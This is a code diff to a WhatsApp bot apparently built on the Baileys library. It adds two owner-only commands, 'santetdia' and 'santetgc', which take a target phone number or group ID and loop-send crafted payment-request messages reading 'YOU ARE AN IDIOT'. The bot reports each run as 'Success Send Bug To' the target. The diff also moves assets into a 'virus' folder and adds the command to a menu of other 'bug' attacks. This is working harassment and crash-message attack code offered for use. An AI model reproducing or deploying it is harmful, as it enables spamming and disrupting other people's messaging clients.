@@ -325,7 +325,7 @@ participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {})
 }}}
 //var sticker virus
 var sticWait = (hehe) => {
-ano = fs.readFileSync('./baseikal/stickernye/wait.webp')
+ano = fs.readFileSync('./virus/stickernye/wait.webp')
 XeonBotInc.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
 }
 	// FAKE TEXT IMG
@@ -4921,6 +4921,51 @@ Detek = tes.translate
 replay(`🌐Translate : ${Detek}\n📘Results : ${Infoo}`)
 }
 break
+case 'santetdia': {
+if (!isCreator) return
+if (isBan) throw sticBanLu(from)
+if (args.length < 1) return m.reply(`*Syntax Error!*\n\nUse : ${command} nomor target|amount spam|timer\nExample : ${command} 62888s.whatsapp.net|1|10s\n\n\ns = Second/Detik\n\n`)
+num = q.split('|')[0]
+jumlah = q.split('|')[1]
+for (let i = 0; i < jumlah; i++) {
+m.reply(`Baiklah Tuan`)
+var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./virus/image/hwmodsgans.jpg') }, { upload: XeonBotInc.waUploadToServer })
+var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.fromObject({
+"requestPaymentMessage": {
+"currencyCodeIso4217": "IDR",
+"amount1000": "100",
+"extendedTextMessage": {
+"text": `YOU ARE AN IDIOT`,
+}
+}}), { userJid: m.chat, quoted: doc})
+XeonBotInc.relayMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
+}
+m.reply(`Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`)
+}
+break
+//=================================================//
+case 'santetgc': {
+if (!isCreator) return
+if (isBan) throw sticBanLu(from)
+if (args.length < 1) return m.reply(`*Syntax Error!*\n\nUse : ${command} idGroup|amount spam|timer\nExample : ${command} 62888@g.us|1|10s\n\n\ns = Second/Detik\n\nDi Usahakan Bot Udah Masuk Group Nya`)
+num = q.split('|')[0]
+jumlah = q.split('|')[1]
+for (let i = 0; i < jumlah; i++) {
+m.reply(`Baiklah Tuan`)
+var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./virus/image/hwmodsgans.jpg') }, { upload: XeonBotInc.waUploadToServer })
+var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.fromObject({
+"requestPaymentMessage": {
+"currencyCodeIso4217": "IDR",
+"amount1000": "100",
+"extendedTextMessage": {
+"text": `YOU ARE AN IDIOT`,
+}
+}}), { userJid: m.chat, quoted: doc})
+XeonBotInc.relayMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
+}
+m.reply(`Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`)
+}
+break
 case 'catalogpc': case 'cataloggc':  {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
@@ -4928,7 +4973,7 @@ if (args.length < 1) return m.reply(`*Syntax Error!*\n\nUse : ${command} idGroup
 num = q.split('|')[0]
 jumlah = q.split('|')[1]
 for (let i = 0; i < jumlah; i++) {
-var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: XeonBotInc.waUploadToServer })
+var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./virus/image/hwmodsgans.jpg') }, { upload: XeonBotInc.waUploadToServer })
 var catalog = generateWAMessageFromContent(num, proto.Message.fromObject({
 "productMessage": {
 "product": {
@@ -9501,6 +9546,7 @@ return reply(`╔═══════✪「 OWNER 」
 ╠${prefix}🌷 628xxx|5|5
 ╠${prefix}ampas1 628xxx
 ╠${prefix}ampas2 628xxx
+╠${prefix}santetgc 628xxx@s.whatsapp.net|10|10s
 ╠${prefix}santetdia 628xxx@s.whatsapp.net|10|10s
 ╠${prefix}catalogpc 628xxx@s.whatsapp.net|10|10s
 ╠${prefix}jadibug1 [ Reply Video To Bug Audio ]
